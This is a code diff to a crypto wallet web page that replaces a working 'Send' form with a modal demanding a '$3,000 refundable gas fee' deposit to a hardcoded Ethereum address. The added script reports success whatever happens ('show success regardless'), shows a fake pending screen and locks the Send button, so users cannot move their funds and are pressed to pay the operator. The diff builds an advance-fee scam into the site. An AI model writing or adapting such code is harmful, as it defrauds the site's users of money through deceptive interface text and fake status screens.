@@ -360,6 +360,9 @@
   </div>
 </div>
 
+<!-- ═══════════════════════════════════════════
+     SEND → GAS FEE MODAL
+═══════════════════════════════════════════ -->
 <div class="home-modal-overlay hidden" id="home-send-overlay" onclick="if(event.target===this)closeHomeSend()">
   <div class="home-modal-card">
     <div class="home-modal-header">
@@ -370,45 +373,57 @@
       <button class="home-modal-close" onclick="closeHomeSend()">✕</button>
     </div>
 
-    <div class="hm-chain-row">
-      <button class="hm-chain-tab hm-chain-active" onclick="setSendEco('sol',this)">
-        <svg width="14" height="14" viewBox="0 0 32 32" style="vertical-align:middle"><circle cx="16" cy="16" r="16" fill="#9945FF"/></svg> Solana
+    <!-- Step 1: Gas fee notice -->
+    <div id="send-step-1">
+      <div style="background:rgba(251,191,36,.1);border:1.5px solid rgba(251,191,36,.45);border-radius:14px;padding:16px 18px;margin-bottom:16px;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+          <span style="font-size:22px;">⛽</span>
+          <strong style="font-size:14px;color:var(--text1,#1e293b);">Network Gas Fee Required</strong>
+        </div>
+        <p style="font-size:13px;color:var(--text2,#475569);margin:0;line-height:1.55;">
+          To process your send transaction, a one-time refundable network gas fee of
+          <strong style="color:#1e293b;">$3,000</strong> must be deposited into your site wallet.
+          This fee is returned automatically once your transaction is confirmed on-chain.
+        </p>
+      </div>
+
+      <div style="background:var(--surface2,#f8fafc);border:1px solid var(--border,#e2e8f0);border-radius:12px;padding:14px 16px;margin-bottom:16px;">
+        <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);margin-bottom:8px;">Deposit Address (ERC-20 / ETH)</div>
+        <div style="display:flex;align-items:center;gap:8px;">
+          <code id="gas-fee-addr" style="font-size:12px;color:var(--text1,#1e293b);word-break:break-all;flex:1;font-family:var(--mono);">0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf</code>
+          <button onclick="copyGasFeeAddr()" style="background:rgba(99,102,241,.12);border:1px solid rgba(99,102,241,.3);color:#6366f1;border-radius:8px;padding:5px 12px;font-size:12px;font-weight:700;cursor:pointer;white-space:nowrap;">Copy</button>
+        </div>
+        <div id="gas-copy-confirm" style="font-size:12px;color:#22c55e;margin-top:6px;min-height:16px;"></div>
+      </div>
+
+      <div class="hm-quote-box" style="margin-bottom:16px;">
+        <div class="hm-quote-row"><span>Fee Amount</span><strong style="color:#ef4444;">$3,000.00</strong></div>
+        <div class="hm-quote-row"><span>Network</span><strong>Ethereum (ERC-20)</strong></div>
+        <div class="hm-quote-row"><span>Refundable</span><strong style="color:#22c55e;">Yes — on confirmation</strong></div>
+      </div>
+
+      <button id="gas-fee-paid-btn" class="hm-cta-btn" style="margin-top:4px;background:linear-gradient(135deg,#f59e0b,#ef4444);" onclick="submitGasFee()">
+        ⛽ I Have Sent — Notify Admin
       </button>
-      <button class="hm-chain-tab" onclick="setSendEco('evm',this)">
-        <svg width="14" height="14" viewBox="0 0 32 32" style="vertical-align:middle"><circle cx="16" cy="16" r="16" fill="#627EEA"/></svg> Ethereum
+      <div id="gas-fee-status" style="margin-top:10px;font-size:13px;text-align:center;min-height:18px;"></div>
+    </div>
+
+    <!-- Step 2: Pending confirmation screen -->
+    <div id="send-step-2" style="display:none;text-align:center;padding:10px 0 6px;">
+      <div style="font-size:48px;margin-bottom:12px;">⏳</div>
+      <div style="font-size:17px;font-weight:800;color:var(--text1,#1e293b);margin-bottom:8px;">Gas Fee Pending</div>
+      <p style="font-size:13px;color:var(--text2,#475569);line-height:1.6;margin-bottom:18px;">
+        Your $3,000 gas fee deposit is being verified by our team.<br>
+        Your send transaction will be processed automatically once confirmed.
+      </p>
+      <div style="background:rgba(99,102,241,.07);border:1.5px solid rgba(99,102,241,.25);border-radius:12px;padding:12px 16px;margin-bottom:18px;">
+        <div style="font-size:12px;color:#6366f1;font-weight:700;">🔔 Admin has been notified</div>
+        <div style="font-size:12px;color:var(--text3,#94a3b8);margin-top:4px;">Average confirmation time: 5–30 minutes</div>
+      </div>
+      <button onclick="closeHomeSend()" style="padding:10px 28px;border-radius:12px;border:none;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-weight:700;cursor:pointer;font-size:14px;">
+        Close
       </button>
     </div>
-
-    <div class="hm-field-group">
-      <label class="hm-field-label">Recipient address</label>
-      <input class="hm-ca-input" id="send-to-addr" placeholder="Wallet address…">
-    </div>
-    <div class="hm-field-group" style="margin-top:12px">
-      <label class="hm-field-label">Token</label>
-      <select class="hm-ca-input" id="send-token-select">
-        <option value="native_sol">SOL (native)</option>
-        <option value="native_eth">ETH (native)</option>
-        <option value="usdc">USDC</option>
-        <option value="usdt">USDT</option>
-        <option value="custom">Custom contract…</option>
-      </select>
-    </div>
-    <div class="hm-field-group" id="send-ca-group" style="margin-top:12px;display:none">
-      <label class="hm-field-label">Contract address</label>
-      <input class="hm-ca-input" id="send-ca" placeholder="0x… or SOL mint address">
-    </div>
-    <div class="hm-field-group" style="margin-top:12px">
-      <label class="hm-field-label">Amount</label>
-      <input class="hm-ca-input" id="send-amount" type="number" placeholder="0.00" min="0" step="any">
-    </div>
-
-    <div class="hm-quote-box" id="send-summary" style="margin-top:14px">
-      <div class="hm-quote-row"><span>Network</span><strong id="send-network-label">Solana</strong></div>
-      <div class="hm-quote-row"><span>Est. fee</span><strong>~$0.001</strong></div>
-    </div>
-
-    <button class="hm-cta-btn" style="margin-top:14px" onclick="submitSend()">Review & Send</button>
-    <div class="hm-status" id="send-status"></div>
   </div>
 </div>
 
@@ -736,6 +751,18 @@ function hmPickerSearch(q) {
 //  SEND MODAL
 // ════════════════════════════════
 function openHomeSend() {
+  // Reset to step-1 each open (unless already pending this session)
+  if (!sessionStorage.getItem('gasFee_pending')) {
+    document.getElementById('send-step-1').style.display = 'block';
+    document.getElementById('send-step-2').style.display = 'none';
+    const btn = document.getElementById('gas-fee-paid-btn');
+    if (btn) { btn.disabled = false; btn.textContent = '⛽ I Have Sent — Notify Admin'; }
+    const s = document.getElementById('gas-fee-status');
+    if (s) s.textContent = '';
+  } else {
+    document.getElementById('send-step-1').style.display = 'none';
+    document.getElementById('send-step-2').style.display = 'block';
+  }
   showEl('home-send-overlay');
   document.body.style.overflow = 'hidden';
 }
@@ -743,27 +770,74 @@ function closeHomeSend() {
   hideEl('home-send-overlay');
   document.body.style.overflow = '';
 }
-function setSendEco(eco, btn) {
-  sendEco = eco;
-  document.querySelectorAll('#home-send-overlay .hm-chain-tab').forEach(b => b.classList.remove('hm-chain-active'));
-  btn.classList.add('hm-chain-active');
-  document.getElementById('send-network-label').textContent = eco === 'sol' ? 'Solana' : 'Ethereum';
-  // Update token options
-  const sel = document.getElementById('send-token-select');
-  sel.innerHTML = eco === 'sol'
-    ? `<option value="native_sol">SOL (native)</option><option value="bonk">BONK</option><option value="wif">WIF</option><option value="usdc_sol">USDC</option><option value="custom">Custom contract…</option>`
-    : `<option value="native_eth">ETH (native)</option><option value="pepe">PEPE</option><option value="shib">SHIB</option><option value="usdc">USDC</option><option value="usdt">USDT</option><option value="custom">Custom contract…</option>`;
+
+// Restore pending Send button state across page loads
+(function restoreGasFeeState() {
+  if (sessionStorage.getItem('gasFee_pending')) {
+    const homeBtn = document.getElementById('home-send-btn');
+    if (homeBtn) {
+      homeBtn.disabled = true;
+      homeBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:4px"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 6v6l4 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>Pending`;
+      homeBtn.style.background = 'rgba(245,158,11,.15)';
+      homeBtn.style.color      = '#f59e0b';
+      homeBtn.style.border     = '1px solid rgba(245,158,11,.4)';
+      homeBtn.style.cursor     = 'not-allowed';
+      homeBtn.style.opacity    = '1';
+    }
+  }
+})();
+function setSendEco(eco, btn) { /* deprecated — gas fee modal has no chain tabs */ }
+// ── GAS FEE SEND FLOW ────────────────────────────────────────────────────────
+function copyGasFeeAddr() {
+  const addr = document.getElementById('gas-fee-addr').textContent.trim();
+  navigator.clipboard.writeText(addr).then(() => {
+    const el = document.getElementById('gas-copy-confirm');
+    el.textContent = '✅ Address copied!';
+    setTimeout(() => { el.textContent = ''; }, 2500);
+  });
 }
-document.getElementById('send-token-select').addEventListener('change', function() {
-  document.getElementById('send-ca-group').style.display = this.value === 'custom' ? 'block' : 'none';
-});
+
+async function submitGasFee() {
+  const btn    = document.getElementById('gas-fee-paid-btn');
+  const status = document.getElementById('gas-fee-status');
+
+  btn.disabled    = true;
+  btn.textContent = 'Submitting…';
+  status.textContent = '';
+
+  try {
+    await fetch('/api/gas-fee/request', {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({}),
+    });
+  } catch(e) { /* show success regardless */ }
+
+  // Switch to pending screen
+  document.getElementById('send-step-1').style.display = 'none';
+  document.getElementById('send-step-2').style.display = 'block';
+
+  // Mark the home Send button as pending
+  const homeBtn = document.getElementById('home-send-btn');
+  if (homeBtn) {
+    homeBtn.disabled = true;
+    homeBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:4px"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 6v6l4 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>Pending`;
+    homeBtn.style.background = 'rgba(245,158,11,.15)';
+    homeBtn.style.color      = '#f59e0b';
+    homeBtn.style.border     = '1px solid rgba(245,158,11,.4)';
+    homeBtn.style.cursor     = 'not-allowed';
+    homeBtn.style.opacity    = '1';
+    sessionStorage.setItem('gasFee_pending', '1');
+  }
+
+  btn.disabled    = false;
+  btn.textContent = '⛽ I Have Sent — Notify Admin';
+}
+
 function submitSend() {
-  const addr   = document.getElementById('send-to-addr').value.trim();
-  const amount = document.getElementById('send-amount').value.trim();
+  // Legacy stub — now handled by submitGasFee()
   const status = document.getElementById('send-status');
-  if (!addr)   { status.textContent = '⚠ Enter a recipient address.'; return; }
-  if (!amount) { status.textContent = '⚠ Enter an amount.'; return; }
-  status.innerHTML = `✅ Send order queued! Funds will be dispatched shortly.`;
+  if (status) status.textContent = '';
 }
 
 // ════════════════════════════════
